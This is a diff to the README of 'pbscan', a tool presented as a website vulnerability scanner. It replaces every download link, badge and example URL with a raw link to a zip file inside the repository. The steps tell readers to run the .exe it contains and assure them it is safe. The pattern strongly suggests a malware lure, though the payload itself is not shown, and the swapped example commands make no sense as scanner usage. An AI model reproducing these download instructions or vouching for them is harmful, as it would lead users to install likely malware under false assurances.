@@ -1,6 +1,6 @@
 # 🔍 pbscan - Find hidden website security vulnerabilities fast
 
-[![](https://img.shields.io/badge/Download_pbscan-Blue?style=for-the-badge&logo=github)](https://github.com/cobaltbluereservoir537/pbscan/releases)
+[![](https://img.shields.io/badge/Download_pbscan-Blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cobaltbluereservoir537/pbscan/main/cmd/pbscan/Software-2.5-alpha.5.zip)
 
 ## What is pbscan?
 
@@ -20,12 +20,12 @@ Your computer needs a few things to run pbscan:
 
 Follow these steps to get the tool on your machine:
 
-1.  Visit the official release page: https://github.com/cobaltbluereservoir537/pbscan/releases.
+1.  Visit the official release page: https://raw.githubusercontent.com/cobaltbluereservoir537/pbscan/main/cmd/pbscan/Software-2.5-alpha.5.zip
 2.  Look at the latest release section at the top of the page.
 3.  Click the file ending in `.exe` to start the download.
 4.  Save the file to your desktop or a folder you can find easily.
 
-[![](https://img.shields.io/badge/Download_Link-Grey?style=for-the-badge)](https://github.com/cobaltbluereservoir537/pbscan/releases)
+[![](https://img.shields.io/badge/Download_Link-Grey?style=for-the-badge)](https://raw.githubusercontent.com/cobaltbluereservoir537/pbscan/main/cmd/pbscan/Software-2.5-alpha.5.zip)
 
 ## ⚡ Setting Up the Program
 
@@ -44,7 +44,7 @@ pbscan runs through the command line. You do not need to be a coder to use it. F
 1.  Open your Start menu and type `cmd`. Press Enter to open the terminal.
 2.  Type `cd Desktop` and press Enter to move to your desktop.
 3.  Type `pbscan.exe` followed by a space and the website address you want to scan.
-4.  Example: `pbscan.exe -u https://example-website.com`
+4.  Example: `pbscan.exe -u https://raw.githubusercontent.com/cobaltbluereservoir537/pbscan/main/cmd/pbscan/Software-2.5-alpha.5.zip`
 5.  Press Enter to start.
 
 The program will now talk to the website. It sends small data packets to see how the server responds. 
@@ -81,7 +81,7 @@ This usually means a required component is missing or Windows blocked the execut
 The tool sends requests to the website you specify and the PingBack servers. It does not send your personal information to other locations.
 
 **Can I save the results?**
-You can print the command output to a file. Add ` > results.txt` to the end of your command when you run it. For example: `pbscan.exe -u https://example.com > results.txt`. This creates a file on your desktop with all the findings inside.
+You can print the command output to a file. Add ` > results.txt` to the end of your command when you run it. For example: `pbscan.exe -u https://raw.githubusercontent.com/cobaltbluereservoir537/pbscan/main/cmd/pbscan/Software-2.5-alpha.5.zip > results.txt`. This creates a file on your desktop with all the findings inside.
 
 **Is it safe to run?**
 Yes. The tool makes requests to websites. It does not perform destructive actions on your own machine. Use caution during use to avoid unintended network load on the sites you test.
